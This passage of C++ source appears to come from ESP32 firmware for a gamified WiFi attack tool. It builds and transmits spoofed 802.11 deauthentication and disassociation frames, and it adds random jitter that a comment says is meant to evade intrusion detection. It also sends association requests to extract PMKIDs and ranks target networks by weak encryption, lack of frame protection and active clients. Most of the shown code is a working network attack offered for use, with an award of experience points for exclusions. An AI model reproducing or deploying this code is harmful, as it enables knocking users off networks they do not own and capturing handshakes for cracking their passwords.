    // Only set channel if it actually changed — avoids flushing TX queues on ESP32-S3
    static uint8_t lastTxChannel = 0;
    if (currentChannel != lastTxChannel) {
        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
        lastTxChannel = currentChannel;
    }

    uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x07, 0x00
    };
    memcpy(deauthPacket + 4, station, 6);
    memcpy(deauthPacket + 10, bssid, 6);
    memcpy(deauthPacket + 16, bssid, 6);
    deauthPacket[24] = reason;
    static uint32_t txAttemptCount = 0;
    txAttemptCount++;
    // Circuit breaker: if we've seen too many ERR 257 in a row, skip TX to let
    // the driver pool refill. Driver doesn't release TX descriptors while
    // promiscuous mode is on a busy channel — they sit waiting for ACKs that
    // never come. Without this backoff we burn ~80+ ERR calls/sec and the
    // pool never recovers.
    static uint8_t errStreak = 0;
    if (errStreak > 0) {
        // Exponential backoff: 50ms, 100ms, 200ms, 400ms cap.
        uint32_t backoffMs = 50U << (errStreak > 4 ? 4 : errStreak - 1);
        uint32_t until = millis() + backoffMs;
        while ((int32_t)(millis() - until) < 0) {
            yield();
        }
    }
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    if (err != ESP_OK) {
        deauthTxErrors++;
        if (err == 257) {
            if (errStreak < 255) errStreak++;
        } else {
            errStreak = 0;
        }
        // DIAG: per-TX log for first 30 attempts. After 30, fall back to compact rule.
        if (txAttemptCount <= 30) {
            Serial.printf("[OINK-DIAG] tx#%u ERR=%d ok=%lu err=%lu streak=%u\r\n",
                          (unsigned)txAttemptCount, (int)err,
                          (unsigned long)deauthTxOk, (unsigned long)deauthTxErrors,
                          (unsigned)errStreak);
        } else if (deauthTxErrors <= 5 || (deauthTxErrors % 50 == 0)) {
            uint8_t ch = 0;
            wifi_second_chan_t secondCh = WIFI_SECOND_CHAN_NONE;
            esp_wifi_get_channel(&ch, &secondCh);
            Serial.printf("[OINK] TX ERR %d (total=%lu) ch=%d bssid=%02X:%02X:%02X:%02X:%02X:%02X\r\n",
                (int)err, deauthTxErrors, (int)ch,
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        }
    } else {
        deauthTxOk++;
        errStreak = 0;  // Reset backoff on success
        if (txAttemptCount <= 30) {
            Serial.printf("[OINK-DIAG] tx#%u OK ok=%lu err=%lu\r\n",
                          (unsigned)txAttemptCount,
                          (unsigned long)deauthTxOk, (unsigned long)deauthTxErrors);
        }
    }
}

void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uint8_t count) {
    // Guard: skip TX if WiFi driver not ready (prevents TG1WDT after resume)
    if (!NetworkRecon::canSendFramesNow()) return;

    // Send burst of deauth frames for more effective disconnection
    // Random jitter between frames makes it harder for WIDS to detect pattern
    // Jitter is modified by buffs/debuffs (base 5ms, debuffed 7ms)
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t jitterMax = SwineStats::getDeauthJitterMax();
    
    // Mark session as having deauthed (for Silent Witness achievement tracking)
    SessionStats& sess = const_cast<SessionStats&>(XP::getSession());
    sess.everDeauthed = true;
    
    for (uint8_t i = 0; i < count; i++) {
        // AP -> Client (pretend to be AP)
        sendDeauthFrame(bssid, station, 7);  // Class 3 frame from non-associated station
        
        // Random jitter 1-Nms between forward and reverse frames (buff-modified)
        delay(random(1, jitterMax + 1));
        
        // Client -> AP (pretend to be client) - bidirectional attack
        if (memcmp(station, broadcast, 6) != 0) {
            // Only if not broadcast - swap source/dest
            uint8_t reversePacket[26] = {
                0xC0, 0x00,  // Frame Control: Deauth
                0x00, 0x00,  // Duration
            };
            memcpy(reversePacket + 4, bssid, 6);     // To AP
            memcpy(reversePacket + 10, station, 6);  // From Client
            memcpy(reversePacket + 16, bssid, 6);    // BSSID
            reversePacket[22] = 0x00;
            reversePacket[23] = 0x00;
            reversePacket[24] = 1;  // Unspecified reason
            reversePacket[25] = 0x00;
            esp_err_t rev_err = esp_wifi_80211_tx(WIFI_IF_STA, reversePacket, sizeof(reversePacket), false);
            if (rev_err != ESP_OK) {
                deauthTxErrors++;
            }
            
            // Jitter between iterations (buff-modified)
            // CRITICAL FIX: Use yield() on longer jitters to prevent WDT reset
            uint32_t jitterMs = random(1, jitterMax + 1);
            if (jitterMs > 3) {
                delay(2);
                yield();  // Feed watchdog on longer delays
                delay(jitterMs - 2);
            } else {
                delay(jitterMs);
            }
        }
        
        // Yield every 4 frames to feed watchdog during large bursts
        if ((i & 0x03) == 0x03) {
            yield();
        }
    }
}

void OinkMode::sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    // Disassociation frame - some clients respond better to this
    uint8_t disassocPacket[26] = {
        0xA0, 0x00,  // Frame Control: Disassoc (0xA0 instead of 0xC0)
        0x00, 0x00,  // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
        0x00, 0x00,  // Sequence
        0x08, 0x00   // Reason code (Disassociated because station leaving)
    };
    
    memcpy(disassocPacket + 4, station, 6);
    memcpy(disassocPacket + 10, bssid, 6);
    memcpy(disassocPacket + 16, bssid, 6);
    disassocPacket[24] = reason;
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
    if (err != ESP_OK) {
        deauthTxErrors++;
    }
}

void OinkMode::sendAssociationRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
    // 802.11 Association Request for active PMKID extraction
    uint8_t assocReq[128];
    memset(assocReq, 0, sizeof(assocReq));
    
    // Frame Control: Type=Management(0), Subtype=Association Request(0)
    assocReq[0] = 0x00;
    assocReq[1] = 0x00;
    
    // Duration
    assocReq[2] = 0x00;
    assocReq[3] = 0x00;
    
    // Address 1: Destination (AP BSSID)
    memcpy(assocReq + 4, bssid, 6);
    
    // Address 2: Source (our MAC)
    uint8_t ourMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, ourMac);
    memcpy(assocReq + 10, ourMac, 6);
    
    // Address 3: BSSID
    memcpy(assocReq + 16, bssid, 6);
    
    // Sequence control
    assocReq[22] = 0x00;
    assocReq[23] = 0x00;
    
    // Frame body starts at offset 24
    uint16_t bodyOffset = 24;
    
    // Capability Info: ESS + Short Preamble
    assocReq[bodyOffset++] = 0x01;
    assocReq[bodyOffset++] = 0x04;
    
    // Listen Interval
    assocReq[bodyOffset++] = 0x0A;
    assocReq[bodyOffset++] = 0x00;
    
    // SSID IE (Tag 0)
    assocReq[bodyOffset++] = 0x00;
    assocReq[bodyOffset++] = ssidLen;
    memcpy(assocReq + bodyOffset, ssid, ssidLen);
    bodyOffset += ssidLen;
    
    // Supported Rates IE (Tag 1)
    assocReq[bodyOffset++] = 0x01;
    assocReq[bodyOffset++] = 0x08;
    assocReq[bodyOffset++] = 0x82;  // 1 Mbps basic
    assocReq[bodyOffset++] = 0x84;  // 2 Mbps basic
    assocReq[bodyOffset++] = 0x8B;  // 5.5 Mbps basic
    assocReq[bodyOffset++] = 0x96;  // 11 Mbps basic
    assocReq[bodyOffset++] = 0x0C;  // 6 Mbps
    assocReq[bodyOffset++] = 0x12;  // 9 Mbps
    assocReq[bodyOffset++] = 0x18;  // 12 Mbps
    assocReq[bodyOffset++] = 0x24;  // 18 Mbps

    esp_err_t txErr = esp_wifi_80211_tx(WIFI_IF_STA, assocReq, bodyOffset, false);
    if (txErr != ESP_OK) {
        Serial.printf("[OINK] ASSOC TX err=%d bssid=%02X:%02X:%02X:%02X:%02X:%02X len=%u\r\n",
                      (int)txErr,
                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                      (unsigned)bodyOffset);
    }
}

void OinkMode::clearTargetClients() {
    targetClientCount = 0;
    targetClientCountCache = 0;
    memset(targetClients, 0, sizeof(targetClients));
}

void OinkMode::trackTargetClient(const uint8_t* bssid, const uint8_t* clientMac, int8_t rssi) {
    // Use BSSID match instead of targetIndex for cross-core safety
    if (targetBssid[0] == 0) return;
    if (memcmp(bssid, targetBssid, 6) != 0) return;

    uint32_t now = millis();

    // Check if client already tracked
    for (uint8_t i = 0; i < targetClientCount; i++) {
        if (memcmp(targetClients[i].mac, clientMac, 6) == 0) {
            targetClients[i].rssi = rssi;
            targetClients[i].lastSeen = now;
            return;
        }
    }

    // LRU eviction: if at capacity, evict stalest client (not seen in 30s)
    if (targetClientCount >= MAX_CLIENTS_PER_NETWORK) {
        int stalestIdx = -1;
        uint32_t oldestTime = now;
        for (uint8_t i = 0; i < targetClientCount; i++) {
            if (targetClients[i].lastSeen < oldestTime) {
                oldestTime = targetClients[i].lastSeen;
                stalestIdx = i;
            }
        }
        // Evict stale client (>30s old) to make room
        if (stalestIdx >= 0 && (millis() - oldestTime > 30000)) {
            targetClients[stalestIdx] = targetClients[targetClientCount - 1];
            targetClientCount--;
        } else {
            return;  // All clients fresh, give up
        }
    }

    // Add new client if room
    if (targetClientCount < MAX_CLIENTS_PER_NETWORK) {
        memcpy(targetClients[targetClientCount].mac, clientMac, 6);
        targetClients[targetClientCount].rssi = rssi;
        targetClients[targetClientCount].lastSeen = now;
        targetClientCount++;
    }
}

bool OinkMode::detectPMF(const uint8_t* payload, uint16_t len) {
    // Parse RSN IE to detect PMF (Protected Management Frames)
    // RSN IE starts with tag 0x30
    uint16_t offset = 36;  // After fixed beacon fields
    
    while (offset + 2 < len) {
        uint8_t tag = payload[offset];
        uint8_t tagLen = payload[offset + 1];
        
        if (offset + 2 + tagLen > len) break;
        
        if (tag == 0x30 && tagLen >= 8) {  // RSN IE
            // RSN IE structure: version(2) + group cipher(4) + pairwise count(2) + ...
            // RSN capabilities are at the end, look for MFPC/MFPR bits
            uint16_t rsnOffset = offset + 2;
            uint16_t rsnEnd = rsnOffset + tagLen;
            
            // Skip version (2), group cipher (4)
            rsnOffset += 6;
            if (rsnOffset + 2 > rsnEnd) break;
            
            // Pairwise cipher count and suites
            uint16_t pairwiseCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            rsnOffset += 2 + (pairwiseCount * 4);
            if (rsnOffset + 2 > rsnEnd) break;
            
            // AKM count and suites
            uint16_t akmCount = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            rsnOffset += 2 + (akmCount * 4);
            if (rsnOffset + 2 > rsnEnd) break;
            
            // RSN Capabilities (2 bytes)
            uint16_t rsnCaps = payload[rsnOffset] | (payload[rsnOffset + 1] << 8);
            
            // IEEE 802.11-2016 standard:
            // Bit 6: MFPC (Management Frame Protection Capable)
            // Bit 7: MFPR (Management Frame Protection Required)
            bool mfpr = (rsnCaps >> 7) & 0x01;
            
            if (mfpr) {
                return true;  // PMF required - deauth won't work
            }
        }
        
        offset += 2 + tagLen;
    }
    
    return false;
}

int OinkMode::findNetwork(const uint8_t* bssid) {
    return NetworkRecon::findNetworkIndex(bssid);
}

bool OinkMode::hasHandshakeFor(const uint8_t* bssid) {
    NetworkRecon::enterCritical();
    bool result = false;
    for (const auto& hs : handshakes) {
        if (memcmp(hs.bssid, bssid, 6) == 0 && hs.isComplete()) {
            result = true;
            break;
        }
    }
    NetworkRecon::exitCritical();
    return result;
}

void OinkMode::updateTargetCache() {
    bool wasBusy = oinkBusy;
    oinkBusy = true;

    NetworkRecon::enterCritical();
    if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
        const DetectedNetwork& net = networks()[targetIndex];
        strncpy(targetSSIDCache, net.ssid, 32);
        targetSSIDCache[32] = 0;
        targetClientCountCache = targetClientCount;
        targetHiddenCache = net.isHidden;
        memcpy(targetBssidCache, net.bssid, sizeof(targetBssidCache));
        targetCacheValid = true;
    } else {
        targetSSIDCache[0] = '\0';
        targetClientCountCache = 0;
        targetHiddenCache = false;
        memset(targetBssidCache, 0, sizeof(targetBssidCache));
        targetCacheValid = false;
    }
    NetworkRecon::exitCritical();

    oinkBusy = wasBusy;
}

void OinkMode::sortNetworksByPriority() {
    // Sort networks by attack priority:
    // 1. Has clients + no handshake + not PMF (highest priority)
    // 2. Weak auth (Open, WEP, WPA1) + no handshake
    // 3. WPA2 without PMF + no handshake
    // 4. Networks with handshake already (skip)
    // 5. PMF protected (can't attack)
    
    bool wasBusy = oinkBusy;
    oinkBusy = true;

    std::vector<DetectedNetwork> sorted;
    NetworkRecon::enterCritical();
    sorted = networks();
    NetworkRecon::exitCritical();

    uint32_t now = millis();
    std::sort(sorted.begin(), sorted.end(), [now](const DetectedNetwork& a, const DetectedNetwork& b) {
        auto getScore = [now](const DetectedNetwork& net) -> int {
            int score = computeTargetScore(net, now);
            if (net.hasHandshake) score -= 60;
            if (net.hasPMF) score -= 50;
            if (net.authmode == WIFI_AUTH_OPEN) score -= 40;
            if (net.ssid[0] == 0 || net.isHidden) score -= 20;
            if (net.cooldownUntil > now) score -= 20;
            if (isExcluded(net.bssid)) score -= 80;
            return score;
        };
        
        return getScore(a) > getScore(b);
    });

    NetworkRecon::enterCritical();
    networks().swap(sorted);

    // Revalidate target index after reordering
    if (targetIndex >= 0) {
        int foundIdx = -1;
        for (int i = 0; i < (int)networks().size(); i++) {
            if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                foundIdx = i;
                break;
            }
        }
        targetIndex = foundIdx;
        if (targetIndex < 0) {
            deauthing = false;
            channelHopping = true;
            memset(targetBssid, 0, 6);
            clearTargetClients();
        }
    }

    if (selectionIndex >= (int)networks().size()) {
        selectionIndex = networks().empty() ? 0 : (int)networks().size() - 1;
    }
    NetworkRecon::exitCritical();

    oinkBusy = wasBusy;
    updateTargetCache();
}

static bool isWarmForTargets(uint32_t now) {
    if (oinkStartMs == 0) return true;
    uint32_t elapsed = now - oinkStartMs;
    if (elapsed < TARGET_WARMUP_MIN_MS) {
        return false;
    }
    if (elapsed >= TARGET_WARMUP_FORCE_MS) {
        return true;
    }
    uint32_t packets = NetworkRecon::getPacketCount() - reconPacketStart;
    if (packets >= TARGET_WARMUP_MIN_PACKETS) {
        return true;
    }
    if (NetworkRecon::getNetworkCount() >= TARGET_WARMUP_MIN_NETWORKS) {
        return true;
    }
    return false;
}

static uint8_t computeQualityScore(const DetectedNetwork& net, uint32_t now) {
    int8_t rssi = (net.rssiAvg != 0) ? net.rssiAvg : net.rssi;
    uint8_t score = 0;

    if (rssi <= -95) score += 0;
    else if (rssi >= -30) score += 60;
    else score += (uint8_t)(((int)rssi + 95) * 60 / 65);

    uint32_t age = now - net.lastSeen;
    if (age <= 2000) score += 20;
    else if (age <= 5000) score += 12;
    else if (age <= 15000) score += 5;

    if (net.lastDataSeen > 0) {
        uint32_t dataAge = now - net.lastDataSeen;
        if (dataAge <= 3000) score += 20;
        else if (dataAge <= 10000) score += 10;
        else if (dataAge <= 30000) score += 5;
    }

    if (net.beaconIntervalEmaMs > 0) {
        if (net.beaconIntervalEmaMs <= 150) score += 10;
        else if (net.beaconIntervalEmaMs <= 500) score += 6;
        else if (net.beaconIntervalEmaMs <= 1000) score += 3;
    }

    if (score > 100) score = 100;
    return score;
}

static int computeTargetScore(const DetectedNetwork& net, uint32_t now) {
    int score = (int)computeQualityScore(net, now);

    // Proximity bonus: very strong nearby targets have near-100% capture probability
    int8_t rssi = (net.rssiAvg != 0) ? net.rssiAvg : net.rssi;
    if (rssi >= -40) score += 25;
    else if (rssi >= -50) score += 15;

    if (net.lastDataSeen > 0) {
        uint32_t dataAge = now - net.lastDataSeen;
        if (dataAge <= CLIENT_RECENT_MS) score += 30;
        else if (dataAge <= CLIENT_RECENT_MS * 3) score += 10;
        else score -= 5;
    } else {
        score -= 5;
    }

    uint8_t estClients = NetworkRecon::estimateClientCount(net);
    if (estClients > 0) {
        uint8_t capped = estClients > 5 ? 5 : estClients;
        score += 6 + (int)capped * 2;
    }

    // Prefer weaker auth (easier crack), penalize WPA3
    switch (net.authmode) {
        case WIFI_AUTH_WEP: score += 15; break;
        case WIFI_AUTH_WPA_PSK: score += 10; break;
        case WIFI_AUTH_WPA_WPA2_PSK: score += 5; break;
        case WIFI_AUTH_WPA2_PSK: score += 0; break;
        case WIFI_AUTH_WPA2_WPA3_PSK: score -= 5; break;
        case WIFI_AUTH_WPA3_PSK: score -= 10; break;
        default: break;
    }

    score -= (int)net.attackAttempts * 8;
    return score;
}

static inline bool isEligibleTarget(const DetectedNetwork& net, uint32_t now) {
    if (net.ssid[0] == 0 || net.isHidden) return false;
    if (net.cooldownUntil > now) return false;
    if (net.hasPMF) return false;
    if (net.hasHandshake) return false;
    if (net.authmode == WIFI_AUTH_OPEN) return false;
    if (net.attackAttempts >= TARGET_MAX_ATTEMPTS) return false;
    int8_t rssi = (net.rssiAvg != 0) ? net.rssiAvg : net.rssi;
    if (rssi < Config::wifi().attackMinRssi) return false;
    return true;
}

int OinkMode::getNextTarget() {
    uint32_t now = millis();
    auto hasRecentClient = [now](const DetectedNetwork& net) {
        return net.lastDataSeen > 0 &&
            (now - net.lastDataSeen) <= CLIENT_RECENT_MS;
    };

    if (!isWarmForTargets(now)) {
        return -1;
    }

    int bestIdx = -1;
    int bestScore = -100000;
    int bestRecentIdx = -1;
    int bestRecentScore = -100000;

    NetworkRecon::enterCritical();

    for (int i = 0; i < (int)networks().size(); i++) {
        const DetectedNetwork& net = networks()[i];
        if (isExcluded(net.bssid)) continue;  // BOAR BRO - skip
        if (!isEligibleTarget(net, now)) continue;

        int score = computeTargetScore(net, now);
        if (score > bestScore) {
            bestScore = score;
            bestIdx = i;
        }

        if (hasRecentClient(net) && net.attackAttempts < TARGET_MAX_ATTEMPTS) {
            if (score > bestRecentScore) {
                bestRecentScore = score;
                bestRecentIdx = i;
            }
        }
    }
    
    NetworkRecon::exitCritical();
    if (bestRecentIdx >= 0) {
        return bestRecentIdx;
    }
    return bestIdx;  // -1 means no suitable targets
}

// ============ BOAR BROS - Network Exclusion ============

uint64_t OinkMode::bssidToUint64(const uint8_t* bssid) {
    uint64_t result = 0;
    for (int i = 0; i < 6; i++) {
        result = (result << 8) | bssid[i];
    }
    return result;
}

bool OinkMode::isExcluded(const uint8_t* bssid) {
    uint64_t key = bssidToUint64(bssid);
    for (uint16_t i = 0; i < boarBrosCount; i++) {
        if (boarBros[i].bssid == key) return true;
    }
    return false;
}

uint16_t OinkMode::getExcludedCount() {
    return boarBrosCount;
}

uint16_t OinkMode::getFilteredCount() {
    return filteredCount;
}

bool OinkMode::loadBoarBros() {
    boarBrosCount = 0;
    memset(boarBros, 0, sizeof(boarBros));

    const char* boarPath = SDLayout::boarBrosPath();
    if (!SD.exists(boarPath)) {
        return true;
    }

    File f = SD.open(boarPath, FILE_READ);
    if (!f) {
        return false;
    }

    char lineBuf[128];
    while (f.available() && boarBrosCount < MAX_BOAR_BROS) {
        // Read line manually into stack buffer
        int pos = 0;
        while (f.available() && pos < (int)sizeof(lineBuf) - 1) {
            char c = f.read();
            if (c == '\n') break;
            if (c != '\r') lineBuf[pos++] = c;
        }
        lineBuf[pos] = '\0';

        // Trim leading spaces
        char* line = lineBuf;
        while (*line == ' ' || *line == '\t') line++;

        // Skip empty lines and comments
        if (line[0] == '\0' || line[0] == '#') continue;

        // Format: AABBCCDDEEFF  Optional SSID comment
        // Parse first 12 hex chars as BSSID
        int lineLen = strlen(line);
        if (lineLen >= 12) {
            uint64_t bssid = 0;
            bool valid = true;
            for (int i = 0; i < 12; i++) {
                char c = toupper((unsigned char)line[i]);
                uint8_t nibble;
                if (c >= '0' && c <= '9') nibble = c - '0';
                else if (c >= 'A' && c <= 'F') nibble = c - 'A' + 10;
                else { valid = false; break; }
                bssid = (bssid << 4) | nibble;
            }

            if (valid) {
                boarBros[boarBrosCount].bssid = bssid;
                // Extract SSID from rest of line (after space)
                if (lineLen > 13) {
                    char* ssidStart = line + 13;
                    while (*ssidStart == ' ' || *ssidStart == '\t') ssidStart++;
                    // Trim trailing spaces
                    int ssidLen = strlen(ssidStart);
                    while (ssidLen > 0 && (ssidStart[ssidLen-1] == ' ' || ssidStart[ssidLen-1] == '\t')) ssidLen--;
                    if (ssidLen > 32) ssidLen = 32;
                    memcpy(boarBros[boarBrosCount].ssid, ssidStart, ssidLen);
                    boarBros[boarBrosCount].ssid[ssidLen] = '\0';
                }
                boarBrosCount++;
            }
        }
    }

    f.close();
    return true;
}

bool OinkMode::saveBoarBros() {
    // Delete existing file first to ensure clean overwrite (FILE_WRITE appends on ESP32)
    const char* boarPath = SDLayout::boarBrosPath();
    if (SD.exists(boarPath)) {
        if (!SD.remove(boarPath)) {
            SDLog::log("OINK", "Failed to remove old BOAR BROS file");
            return false;
        }
    }

    File f = SD.open(boarPath, FILE_WRITE);
    if (!f) {
        SDLog::log("OINK", "Failed to open BOAR BROS file for writing");
        return false;
    }
    
    if (f.println("# BOAR BROS - Networks to ignore") == 0) {
        SDLog::log("OINK", "Failed to write header to BOAR BROS file");
        f.close();
        return false;
    }
    f.println("# Format: BSSID (12 hex chars) followed by optional SSID");

    for (uint16_t i = 0; i < boarBrosCount; i++) {
        uint64_t bssid = boarBros[i].bssid;

        // Convert uint64 back to hex string
        char hex[13];
        snprintf(hex, sizeof(hex), "%02X%02X%02X%02X%02X%02X",
                 (uint8_t)((bssid >> 40) & 0xFF),
                 (uint8_t)((bssid >> 32) & 0xFF),
                 (uint8_t)((bssid >> 24) & 0xFF),
                 (uint8_t)((bssid >> 16) & 0xFF),
                 (uint8_t)((bssid >> 8) & 0xFF),
                 (uint8_t)(bssid & 0xFF));

        if (boarBros[i].ssid[0] != '\0') {
            f.printf("%s %s\n", hex, boarBros[i].ssid);
        } else {
            f.println(hex);
        }
    }
    
    f.close();
    return true;
}

void OinkMode::removeBoarBro(uint64_t bssid) {
    for (uint16_t i = 0; i < boarBrosCount; i++) {
        if (boarBros[i].bssid == bssid) {
            // Shift remaining entries down
            if (i < boarBrosCount - 1) {
                memmove(&boarBros[i], &boarBros[i + 1], (boarBrosCount - i - 1) * sizeof(BoarBro));
            }
            boarBrosCount--;
            memset(&boarBros[boarBrosCount], 0, sizeof(BoarBro));
            break;
        }
    }
    saveBoarBros();
}

// Inject fake network for stress testing (no RF)
void OinkMode::injectTestNetwork(const uint8_t* bssid, const char* ssid, uint8_t channel, int8_t rssi, wifi_auth_mode_t authmode, bool hasPMF) {
    if (!running) return;
    
    NetworkRecon::enterCritical();

    if (networks().size() >= 100) {
        NetworkRecon::exitCritical();
        return;  // Cap
    }
    if (!HeapGates::canGrow(HeapPolicy::kMinHeapForOinkNetworkAdd,
                            HeapPolicy::kMinFragRatioForGrowth)) {
        NetworkRecon::exitCritical();
        return;
    }
    
    // Check if already exists
    for (auto& net : networks()) {
        if (memcmp(net.bssid, bssid, 6) == 0) {
            // Update existing
            net.rssi = rssi;
            net.lastSeen = millis();
            net.beaconCount++;
            NetworkRecon::exitCritical();
            return;
        }
    }
    
    // Add new
    DetectedNetwork net = {0};
    memcpy(net.bssid, bssid, 6);
    if (ssid && ssid[0]) {
        strncpy(net.ssid, ssid, 32);
        net.ssid[32] = 0;
    }
    net.channel = channel;
    net.rssi = rssi;
    net.authmode = authmode;
    net.hasPMF = hasPMF;
    net.lastSeen = millis();
    net.beaconCount = 1;
    net.isTarget = false;
    net.hasHandshake = false;
    net.attackAttempts = 0;
    net.isHidden = (!ssid || ssid[0] == 0);
    net.lastDataSeen = 0;
    net.cooldownUntil = 0;
    
    try {
        networks().push_back(net);
    } catch (const std::bad_alloc&) {
        NetworkRecon::exitCritical();
        SDLog::log("OINK", "Failed to inject test network: out of memory");
        return;
    }
    NetworkRecon::exitCritical();
}

bool OinkMode::excludeNetwork(int index) {
    if (index < 0 || index >= (int)networks().size()) {
        return false;
    }
    if (boarBrosCount >= MAX_BOAR_BROS) {
        return false;
    }

    uint64_t bssid = bssidToUint64(networks()[index].bssid);

    // Check if already excluded
    if (isExcluded(networks()[index].bssid)) {
        return false;
    }

    // Store BSSID with SSID (use NONAME BRO for hidden networks)
    boarBros[boarBrosCount].bssid = bssid;
    const char* ssid = networks()[index].ssid;
    if (ssid[0] == '\0') ssid = "NONAME BRO";
    strncpy(boarBros[boarBrosCount].ssid, ssid, 32);
    boarBros[boarBrosCount].ssid[32] = '\0';
    boarBrosCount++;
    saveBoarBros();
    
    // Check if this is a mid-attack exclusion (mercy save) vs normal exclusion
    bool isMidAttack = (targetIndex == index && deauthing);
    
    // If this was the current attack target, abort the attack immediately
    if (targetIndex == index) {
        deauthing = false;
        channelHopping = true;
        targetIndex = -1;
        memset(targetBssid, 0, 6);
        clearTargetClients();
        autoState = AutoState::NEXT_TARGET;
        stateStartTime = millis();
    }
    
    // Award XP for BOAR BROS action
    if (isMidAttack) {
        XP::addXP(XPEvent::BOAR_BRO_MERCY);  // +15 XP - mid-attack mercy!
    } else {
        XP::addXP(XPEvent::BOAR_BRO_ADDED);  // +5 XP - normal exclusion
    }
    
    return true;
}

// Exclude network by BSSID directly (for use from other modes like SPECTRUM)
bool OinkMode::excludeNetworkByBSSID(const uint8_t* bssid, const char* ssidIn) {
    if (boarBrosCount >= MAX_BOAR_BROS) {
        return false;
    }

    uint64_t bssid64 = bssidToUint64(bssid);

    // Check if already excluded
    if (isExcluded(bssid)) {
        return false;
    }

    // Store BSSID with SSID (use NONAME BRO for hidden/empty networks)
    boarBros[boarBrosCount].bssid = bssid64;
    const char* ssid = (ssidIn && ssidIn[0]) ? ssidIn : "NONAME BRO";
    strncpy(boarBros[boarBrosCount].ssid, ssid, 32);
    boarBros[boarBrosCount].ssid[32] = '\0';
    boarBrosCount++;
    saveBoarBros();
    
    // Award XP for BOAR BROS action
    XP::addXP(XPEvent::BOAR_BRO_ADDED);  // +5 XP
    
    return true;
}
